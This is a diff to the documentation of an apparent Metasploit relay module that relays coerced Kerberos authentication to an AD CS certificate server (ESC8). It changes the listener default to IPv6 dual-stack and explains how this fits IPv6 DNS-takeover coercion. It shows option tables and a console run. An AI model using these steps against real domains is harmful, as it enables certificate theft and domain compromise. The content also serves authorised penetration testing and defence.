@@ -136,7 +136,7 @@ Module options (auxiliary/server/relay/esc8_kerberos):
    RHOSTS               ca.ad.example.com  yes       Target address range or CIDR identifier to relay to
    RPORT                80                 yes       The target port (TCP)
    SMBDomain            WORKGROUP          yes       The domain name used during SMB exchange.
-   SRVHOST              0.0.0.0            yes       The local host or network interface to listen on.
+   SRVHOST              ::                 yes       The local host or network interface to listen on.
    SRVPORT              445                yes       The local port to listen on.
    SSL                  false              no        Negotiate SSL/TLS for outgoing connections
    TARGETURI            /certsrv/          yes       The URI for the cert server.
@@ -203,7 +203,7 @@ msf auxiliary(server/relay/esc8_kerberos) > set MODE SPECIFIC_TEMPLATE
 msf auxiliary(server/relay/esc8_kerberos) > set CERT_TEMPLATE Machine
 msf auxiliary(server/relay/esc8_kerberos) > run
 [*] Auxiliary module running as background job 0.
-[*] SMB Server is running. Listening on 0.0.0.0:445
+[*] SMB Server is running. Listening on :::445
 ```
 
 Terminal 2 - coerce the victim with the native IPv6 DNS takeover (either the
@@ -299,6 +299,13 @@ X509v3 Subject Alternative Name:
 
 * This module supports Kerberos only; for NTLM relay to ESC8 use
   `auxiliary/server/relay/esc8`.
+* `SRVHOST` defaults to `::` so the relay listens dual-stack. The documented
+  coercion is an IPv6 DNS takeover, which steers the victim to the attacker
+  over IPv6; a `0.0.0.0` listener is IPv4-only and would silently never
+  receive that connection. On Linux and macOS `::` also accepts IPv4, so
+  A-record (IPv4) coercion still works. On a Windows relay host `::` binds
+  IPv6-only, so there set `SRVHOST` to the attacker IPv6 the coercion hands
+  out (`SPOOF_IP6`). The paired coercion module already defaults to `::`.
 * The relay is one-shot per coerced authentication: a Kerberos AP-REQ is bound to
   the SPN it was issued for, so there is no NTLM-style multi-target challenge loop.
 * A full end-to-end run against a live domain requires the CA and the KDC to be
